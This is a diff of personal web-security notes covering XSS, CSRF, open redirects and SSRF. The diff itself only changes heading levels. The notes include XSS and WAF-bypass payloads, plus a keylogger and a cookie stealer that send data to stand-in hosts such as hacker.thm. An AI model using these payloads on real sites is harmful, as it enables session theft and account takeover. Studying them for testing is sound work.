@@ -60,8 +60,7 @@ Any changes - takes list of urls and regulary changes for new changes on page
 ## LEARN:   
 everything about WAF from security perspective [here](https://github.com/0xInfection/Awesome-WAF)
 
-# Common issues to look for
-## XSS
+# XSS
 - `<img src=x onerror=alert(0)>`
 - `?"></script><base%20c%3D=href%3Dhttps:\mysite>`
     - ex script to send back to site
@@ -72,22 +71,22 @@ everything about WAF from security perspective [here](https://github.com/0xInfec
     - DOM [blueclosure](https://www.blueclosure.com/) - paid
     - [KNOXSS](https://knoxss.me/?page_id=1974) - paid
 
-### notes
+## notes
 - if has sink (place to exe) don't need script tag since program will call for us
 
-### XSS WAF filter?
+## XSS WAF filter?
 - yes - bad since xss most common to mitigate vuln
     - what else are they just filtering?
         - eg: SSRF? Filtering just internal ips?
     - shows overall security
 
-#### WAF Bypasses
+### WAF Bypasses
 - break up words for ex: `<sscriptcript>` -> `<script>` when script gets taken out
 - encode (url / html)
 - polgots - 0 idea what is
     - ex: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`
 
-### Testing for XSS and filtering
+## Testing for XSS and filtering
 1. testing different encoding - weird behavior?
 - does single encoding or double encoding do anything?
     - encoding changes once sent may be finding
@@ -111,18 +110,18 @@ everything about WAF from security perspective [here](https://github.com/0xInfec
 
 XSS filter bypass - [here](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 
-### POC
+## POC
 alerts and such blocked?  
 simple: `console.log("exploit completed)` works
 
-### post exploit payloads
+## post exploit payloads
 * keylogger - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`  
 * execute js - `<script></script>`
 * business logic - `<script>user.changeEmail('attacker@hacker.thm');</script>`
 * Cookies - `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
 
 
-### types
+## types
 * reflected - editing parameters to insert malicious code
     - places to check:
         - url file path
@@ -153,7 +152,7 @@ simple: `console.log("exploit completed)` works
         - not being checked for malicious code
         - messages -> support tickets for staff on priv portal
 
-## CSRF
+# CSRF
 force user to do action on target website from your website (usually vial HTML form ) 
 - eg: `<form action="/login" method="POST">`
 
@@ -184,7 +183,7 @@ Common approach to security:
 
 Since CSRF enables us to make requests under another user, can we force a user to be charged?
 
-## Open url redirects
+# Open url redirects
 Common in programs that use oauth with tokens and a redirect     
 
 encode: & ? # / \  
@@ -200,7 +199,7 @@ normal: `https://www.target.com/login?client_id=123&redirect_url=/sosecure`
 bad: `https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redirect?redirect=1&url=https://www.zseano.com/`
 - this example leads to token being sent to zseano.com
 
-### Keywords for redirection
+## Keywords for redirection
 ```
 goto
 redirect
@@ -212,16 +211,16 @@ referer
 forward
 ```
 
-### Common issues
+## Common issues
 * Not ecoding values correctly
     - especially if target allows for /localRedirects
 
-### Google searching for vuln endpoints
+## Google searching for vuln endpoints
 ```
 return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
 ```
 
-### Is XSS possible?
+## Is XSS possible?
 - redirect -> Location: (not possible)
 - redirect -> window.location: (test for js)
 
@@ -236,7 +235,7 @@ pjavascriptt:confirm`0`
 
 ```
 
-### Payloads:
+## Payloads:
 ``` 
 \/yoururl.com
 \/\/yoururl.com
@@ -257,7 +256,7 @@ https://theirsite.com.mysite.com
 //google%E3%80%82com
 ```
 
-## SSRF
+# SSRF
 In scope domain issueing request to an url/endpoint you have defined  
 - Looking for API console (typically on dev docs page)
     - typically has freatures that take a url peram to execute code
@@ -268,7 +267,7 @@ In scope domain issueing request to an url/endpoint you have defined
     - mayber filter only checking parameter value and not the redirect value
     - check if open redirect works
  
-### Tools: 
+## Tools: 
 - XAMPP - run php code locally 
 - NGROK - public ip 
 
